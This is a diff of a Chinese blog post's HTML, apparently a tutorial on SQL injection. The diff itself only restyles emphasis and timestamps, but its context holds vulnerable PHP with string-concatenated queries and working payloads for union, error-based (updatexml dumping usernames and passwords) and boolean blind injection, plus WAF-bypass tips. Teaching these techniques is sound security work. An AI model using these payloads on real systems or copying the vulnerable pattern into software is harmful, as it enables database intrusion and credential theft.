@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://s2.loli.net/2022/02/24/ecEnPtXKhJqdw1B.jpg">
 <meta property="og:image" content="https://s2.loli.net/2022/02/24/bP659ZCEGdpOSFm.png">
 <meta property="article:published_time" content="2022-02-24T02:59:58.829Z">
-<meta property="article:modified_time" content="2022-02-24T03:07:56.229Z">
+<meta property="article:modified_time" content="2022-02-24T03:12:57.696Z">
 <meta property="article:author" content="昊">
 <meta property="article:tag" content="SQLInject">
 <meta name="twitter:card" content="summary">
@@ -246,7 +246,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-02-24 10:59:58 / 修改时间：11:07:56" itemprop="dateCreated datePublished" datetime="2022-02-24T10:59:58+08:00">2022-02-24</time>
+      <time title="创建时间：2022-02-24 10:59:58 / 修改时间：11:12:57" itemprop="dateCreated datePublished" datetime="2022-02-24T10:59:58+08:00">2022-02-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -275,7 +275,7 @@
 <span id="more"></span>
 
 
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>实际上注入类漏洞最<strong>本质的原因就是</strong>，<code>混洗了代码和数据的边界</code>。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>实际上注入类漏洞最<font color="red"> 本质的原因就是</font> ，<code>混洗了代码和数据的边界</code>。</p>
 <p><a href="https://sm.ms/image/bP659ZCEGdpOSFm" target="_blank"><img src="https://s2.loli.net/2022/02/24/bP659ZCEGdpOSFm.png" ></a></p>
 <ul>
 <li>注入的类型总的就只有3种：<ul>
@@ -311,14 +311,14 @@
 </ul>
 </li>
 </ul>
-<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>由<strong>union select</strong>得名，是一种最快的查询方式。</p>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>由<font color="red"> union select</font>得名，是一种最快的查询方式。</p>
 <p>从注入类型来划分讲。</p>
 <h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p>也就是不用闭合，用户的输入直接被解析成了新的SQL语句。</p>
 <p>从代码层面来看如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id + <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
-<p>从上图可以看到<strong>id是以+直接进行拼接的</strong>，这样我们就可以从直接给id，SQL语句让他直接执行以此产生SQL注入。</p>
+<p>从上图可以看到<font color="red"> id是以+直接进行拼接的</font> ，这样我们就可以从直接给id，SQL语句让他直接执行以此产生SQL注入。</p>
 <h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符型就要进行闭合，并且闭合是非常关键的。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -327,16 +327,16 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or 1=1#</span></span><br></pre></td></tr></table></figure>
 
 
-<p>因为<strong>引号的就近匹配</strong>，所以单引号会和左边最近的符号匹配。</p>
+<p>因为<font color="red"> 引号的就近匹配</font> ，所以单引号会和左边最近的符号匹配。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27;or 1=1#&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
 
 
 <p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;</code> 此部分自成一块</p>
 <p><code>#&#39;;&quot;;</code> #之后被注释。</p>
-<p>因此你输入的SQL语句<strong>将被独立代入MySQL数据库解析</strong>，以此达到注入的效果。</p>
+<p>因此你输入的SQL语句<font color="red"> 将被独立代入MySQL数据库解析</font> ，以此达到注入的效果。</p>
 <p>之后的按照注入点划分，也要判断数字型和字符型，以此类推。注入语句将放在后面统一讲。</p>
 <h2 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h2><p>笼统的讲，叠堆注入也是联合注入。</p>
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>测试时发现会<strong>回显报错信息</strong>，就可以试试报错注入。</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>测试时发现会<font color="red"> 回显报错信息</font> ，就可以试试报错注入。</p>
 <ul>
 <li>报错注入主要用到3个函数<ul>
 <li>floor()</li>
@@ -358,8 +358,8 @@
 <li><p>dump</p>
   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">’or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(id,username,password))from(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))or<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
 </ul>
-<p>其他几个函数以此类推，<strong>绕WAF根据数据库版本换成数学函数。</strong></p>
-<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>根据页面的回显不同来判断</strong>。</p>
+<p>其他几个函数以此类推，<font color="red"> 绕WAF根据数据库版本换成数学函数。</font> </p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><font color="red"> 根据页面的回显不同来判断</font> 。</p>
 <p>Payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆表名：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">爆列明：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆数据：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
@@ -378,7 +378,7 @@
 
 
 <p>其他皆可以此类推。</p>
-<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a>group_concat的使用</h1><p>**mysql版本&gt;5.0切使用了information_schema数据库  **</p>
+<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a>group_concat的使用</h1><p><font color="red"> mysql版本&gt;5.0切使用了information_schema数据库  </font> </p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -458,7 +458,7 @@
 
 
 
-<p><strong>上面的还不行就尝试修改语句逻辑再绕过试试</strong></p>
+<p><font color="red"> 上面的还不行就尝试修改语句逻辑再绕过试试</font> </p>
 
     </div>
 
